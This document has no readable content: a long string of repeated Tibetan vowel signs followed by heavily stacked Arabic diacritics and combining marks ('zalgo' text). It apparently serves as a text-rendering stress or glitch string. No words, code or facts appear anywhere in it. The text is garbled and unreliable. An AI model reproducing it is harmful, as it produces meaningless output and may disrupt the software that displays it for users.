ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀིྀೈ̸ًٌٌٍَُِّ̨̲̺̗̻͍̼̜̀ͨ̽͘͏ًٌٍٍَُِِّ̢̞̙̼̗̤̲̄̆ͮͫ͘ͅ͏ًٌٍَُِّ̨͈̋͒͒͌͏̷̸ًًٌٍََُُِّّ̹͚͇͇̯ͪ̄ͧͪ̊ͬ͏̴ًًٌٌٌٍٍٍََُُِِِّّ̨̢̲̞͚̭̤͇̣̺̮̋̋̔̃ͦ̃̐͘͟͞͝͞҉̶̶̶ًًًًٌٌٌٍٍٍََََُُُِِِّّّّ̨̡̨̛̛̛̞͍̠̯̻̞̖̠̫̆ͭ̉ͥ̀̃̀̄ͨ͑̑̂̃͗͘͘͢͟͝͡͝͏̵̸̸̸̴̴ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُُِِِِِّّّّ̛̥̹̹̭͙̲̺̞̹̗̻̞̤̗̲͕̾́́̏̋ͦͧ̀̀͊ͭ̀ͥ̿ͨ̔̀̚͢͜͜͠͠͠͝͏̷̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̧̨̨̛̘̱͓͚͎̦̻̦͉̦͙̞̹̖̳̝ͧ̀̆̅̾͒́̒ͧ̍̋͗̏͗́̍̆̍̂́̄̀ͥ̈́̕͘̕͟͜͟͢͠ͅͅ҉̵ًٌَُّ̮̖̫ͩͯ̃͏̵̷̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̡̨̧̱͈͉̖̱͔͕̹͍͔̱̳̩̞̪̱̈̈͗́̈́ͮ̎̍͗ͬͤ͒́ͭ̈́̇̈́̄̅̀̚͢͢͏̵̶̴̸̸̴̴̵̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̡̧̧̡̧̢̧̧̛͉̼̘͔͈͚̭̝̜͎̯̞͕̘̣̰̗̭̹͚̮̗͍͙̼̫̣̻̲͙̩͊̽̀ͭ̀ͪ̀͆̈́ͬ̐̀͑̀̽͂ͦ̀̿͛̌̎̅̓́̑͐̐ͬ́͆̂͐̚̕͢͟͢͜͢͢͢͜͝͝͝͞͞͞͠ͅ҉̷̴̸̸̷̷̶ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̢̡̢̨̨̨̢̨̧̛̘̩̬̤̳̠̤̝̦͔̟̠̥̬̠͈͇̪̼͔̠̹̺̬̘̣͚̭͙̰̑͆͆ͬ̒͌͗̓͐ͯͪ́̿̆̇ͫ͊͌͒̉ͤͬ̊̆̃̾ͤ͂̀̃ͯ̔ͨ̀ͣ́͑̌ͤͨ̎ͧ̔͂͒̀̂́̕̕̕͘͢͜͜͜͢͠͞͞͠͠͞҉̶̷̸̸̶ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̡̛̟̦̗͎̟̪̘̬͈͕̟̟̎́ͤ͐́̒̈́ͪͧ͑ͪ̆ͤͨ͘̚͜͟͜͠͠͠͠͏ًٌَُّ̩̼ͬ̈͐̏͟͏ِ͕҉̴̵ًًًٌٌٌٍٍٍٍَََُُُِِِّّّ̨̧̝͔̯͇̞̘͚̲͍̠ͦ͆ͧ̑́ͯ̆͜͠͞͠҉ًَُّ̨̺̪̄̉͑͏̴̴̷̵̶̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّ̢̨̨̧̧̧̡̡̛̛̱̖̰̥̯̯͈̻͉̥͇͕̣̫͉̯̝̜̺͓͍̣̙̘͖̭̬͕̥̥̰̤ͪ́ͫ̓̃̈́̌͆́͋̀ͮ̋̐ͪ̀̏̉̿̅̈̄ͣ͆͐̍̈ͮ͐̀ͦ̈̅́ͭ͌̕͘̚͘͟͜͡͝͞͞͝͏̷̶̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̢̧̛̛̛͎̖̱̝̗̹̰͕̟̪͚͚̪͖̗̲̃͋̇̎̒̀͐ͦͤͥ̊ͤ͒̇̀ͪ̋͑͜͢͟͠͝ͅ҉ًًٌٌٍََُُِّّ̢̢̪͙͎̥̳̦̤͆̒͛͂̈́̆̌ͥ͢͡͝͏̴̴ًًًٌٌٌٍٍٍَََُُُِِِِّّّ̨̛̥̮̬̪̰̤͔̬̜͕̟̣̓ͥ̍͛̀ͬ͛̊͑́̇̕͢͠͞͡͏ٍَّ̇̉͡͏̷̶̷̴̵ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̛̤̖̙͕̩͔̤̠̣̼̜̣͎̬͓̤̖ͭ̋̿̂ͤ͊̀͒͗ͩ̑ͦ̀̇̀ͯ͘̚͜͝͡͞͞҉̶̵ًٌٍٍَُِّ̢͔̟̀̽ͧ̈́͟͟͏̶̷̶̴ًًٌٌٍٍََُُِِّّ̨̞̼͕̙̙͙̟ͬ͌ͥ̃ͭͣ͟͝ͅ҉̴̷ًًًٌٌٍٍَََُُِِّّّ̧̧̧̯̺̻͕͈̪̦̮̀̀̐ͪͧͤͨ͊́̓̕҉̴ٌٍَُِّ̻͎̫ͤ̌ͅ҉ً̗̾͏ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̢̘͇̥̤̫͇̳ͧ̀ͫͫ͌̓ͧ́̒̿ͣ̏́ͩ̽̐̕͢͡͠͠҉̵̷̷̵̵ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِّّّّ̡̨̡̢̧̛͙͚̰͉̲͍̬͖̟̮͍̰̺̟͚̣̭ͬͫ́̈́̀͗ͯ̓̽̋̃ͥ͡͝҉̵ٍِّ̰̠̘ͪ҉̴̶̸̵̸ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̡̞͇͎̼̦͚̰̙̹̣͔̣͕̤͈̘͎̇̌̏̇ͬͧ̅̊̀ͪ̍̏̿ͥ̅̌̂͘͜͟͜͢͟͟͢͞͝͞͞͝ͅ҉̷ًٌٍُِّ̭̗̰̞́͒̀̌̾̈͢͏̷̶̷̸̵̴ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّ̧̢̧̧̢̢̛̛͇͉͈͕͇͕̟͚̟͇̗̗̘͔̜̦͔̖̲̗͎͙͉͕̹̘̥̓̽ͩͬͭͮ́̒̽̓̈́̒́ͣ̅̓̿ͩ͋̽̉͐ͮ̌́̂ͮ͊̀͗̐̀̃́͘̕͘͢͟͢͜͟͞͡͝͞͡ͅ҉̵̶̵̷̶̶̸̵ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̢̢̛̛͎̼͔͚̞̲̳̥͓̹̮̮̳̘̜̼̭̠̫̝̜̻͎̫͙̤̣̪̥͍̖̈́́̊̀̌́̈̉͂̏̅͋̓ͦ́̉̈́ͮ̅͊͌ͫ̉͒ͫ̾͋ͭͫͩͧ̓̽̏̐̄ͧͭ͐̚͘͢͜͡͞͞͠͞͝͏̷ٌٍَُِّ̧̧̘̲̫̏̀ͩ҉ًًًٌٌٍٍََُُِِّّ̡̧̧̛̠̦̙̤͖͐̋ͮ͗ͪ̃́͗ͣ͘̕͢͏̸ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̨̛̛̰̝͍̼̱̭̰̲͍̱̙̄͗͐͊̏̆̊̆͐͛̐͋͛ͯ̕͡͝͞͏ًَُّ͙͎̩̃͒͢͡͏̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̢̨̡̛̛̫̲͚͉͓̲̟̠̜͖̲̘͔̑ͤ̋ͧͦͨ̄̓̋̉͘͜͡҉̵̶̸ًًًًٌٌٌٌٍٍٍٍََََُُُِِِِّّّّ̧̢̛̼̗̪̰̳̮͖̱͇̲͖͚̩̽͆̇̄̍̐͑́͐̒ͨͬ̀̍̂͊̊̓́̕̚͢͟͞͞͏̴̵̴̵̷̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِّّّّّ̨̡̧̨̢̢̛̛̦̲͈̺̘̤̞͓̹͓̜̻̯̘̼͙̟̯̞ͭ̅̍͐̆ͬͤ̀̉̑̆̅̔̎̓ͥ̾̑ͨ̔͘͢͟҉ًٌٍٍََُِِّّ̜͈̗͎̼͓ͨ̓͢͝͏̶ًًًٌٌٌٍٍََُُُِِّّ̢̡̢̱̞̘̦̭͖́̇̀̑̏͐̔́͆ͩ̕̚͜͟͜͝͏ٍِّͦͧ̕͏̸̷̵̶ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّ̨̢̧̧̨̜͍̻͙̞͇̞͖͍̜͉̤̻̗̠̗̖̥͕̮̥́ͮ̎̀͆̍̋̇̔̾̌̾͛̍͘̕̕̕͘͞͞͠͡͝͏ّ̤̿͏̶̷̷ًًًٌٌٌٍٍَََُُُِِِّّ̱̱͉̠̼̰͙ͯ̀ͮͮ̌̀̓̈͊̌͒̌͘͘͘͞͏̵̶̴̷̷̶̸̷ًًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍََََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّّ̡̛̛͙͙̳̟͈̰̬̻͖̝͎̫̠͚̣̦̤̮̖̻̬̞̦͉͈͖̗͉̹̺͎͈͙̳̘̗͓͕̲̹̅ͯ̄̊ͨ̇ͦ͐͌́̄ͮ̓̐ͯ́̓̃ͨ̆̔ͪͨ̆ͤͯ̐̓ͬ̔͗̓̆̀̽ͭ̕̕͘̕͟͟͢͟͜͟͝͝͠͞͝͞͝͡͞͞ͅ҉̸ٌٍُِّ̡̡̜͖̦͖ͫ̅̓̍͏ًَ̩͡ͅ҉̵ٌٍُِ͓ͨ̂̏ͪ҉ًَّ̡̝͕